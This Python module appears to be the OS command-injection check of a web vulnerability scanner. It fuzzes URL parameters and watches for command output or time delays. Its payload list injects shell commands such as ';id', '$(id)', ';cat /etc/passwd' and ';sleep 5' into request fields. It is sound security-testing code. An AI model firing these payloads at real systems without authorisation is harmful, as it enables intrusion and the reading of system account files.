"""OS command injection detection."""

import re
import logging
from urllib.parse import parse_qs, urlparse

from web_scanner.scanner import BaseScanner

logger = logging.getLogger(__name__)

CMD_PAYLOADS = [
    (";id", "semicolon"),
    ("|id", "pipe"),
    ("&&id", "double_amp"),
    ("`id`", "backtick"),
    ("$(id)", "dollar_paren"),
    (";cat /etc/passwd", "cat_passwd"),
    ("|cat /etc/passwd", "pipe_cat_passwd"),
    (";whoami", "whoami"),
    ("|whoami", "pipe_whoami"),
    (";sleep 5", "sleep"),
    ("|sleep 5", "pipe_sleep"),
    (";ping -c 5 127.0.0.1", "ping_loopback"),
]

CMD_RESPONSE_PATTERNS = [
    r"uid=\d+\(.*?\)",               # Unix id output
    r"gid=\d+\(.*?\)",
    r"root:x:0:",                    # /etc/passwd
    r"Daemon:\s*root",
    r"nobody:x:",
    r"(www-data|apache|nginx|httpd)",
    r"\broot\b.*\b/bin/(ba)?sh\b",
    r"Command not found",
    r"sh:\s*.*\s*not found",
    r"illegal option",
    r"unexpected end of file",
]


class CommandInjectionScanner(BaseScanner):
    """Detect OS command injection via parameter fuzzing."""

    def run(self):
        findings: list[dict] = []
        resp = self.client.get("/")
        if resp is None:
            return findings

        params = self._extract_params(resp.text)
        params = params if params else ["cmd", "exec", "command", "action", "run", "target", "ip", "host"]

        for param in params:
            for payload, ptype in CMD_PAYLOADS:
                resp = self.client.get(f"?{param}={payload}")
                if resp is None:
                    continue

                # Time-based
                if "sleep" in ptype or "ping" in ptype:
                    elapsed = resp.elapsed.total_seconds()
                    if elapsed >= 4.5:
                        findings.append({
                            "severity": "CRITICAL",
                            "title": f"Command injection (time-based) via '{param}'",
                            "detail": f"Response delayed {elapsed:.1f}s with payload type {ptype}",
                        })
                        break

                # Error/output-based
                for pattern in CMD_RESPONSE_PATTERNS:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        findings.append({
                            "severity": "CRITICAL",
                            "title": f"Command injection ({ptype}) via '{param}'",
                            "detail": "OS command output detected in response",
                        })
                        break

        return findings

    def _extract_params(self, html: str) -> list[str]:
        params = set()
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html, "html.parser")
            for form in soup.find_all("form"):
                for inp in form.find_all(["input", "select", "textarea"]):
                    name = inp.get("name")
                    if name:
                        params.add(name)
            for tag in soup.find_all(True, href=True):
                href = tag.get("href", "")
                if "?" in href:
                    parsed = urlparse(href)
                    params.update(parse_qs(parsed.query).keys())
        except Exception:
            pass
        return list(params)
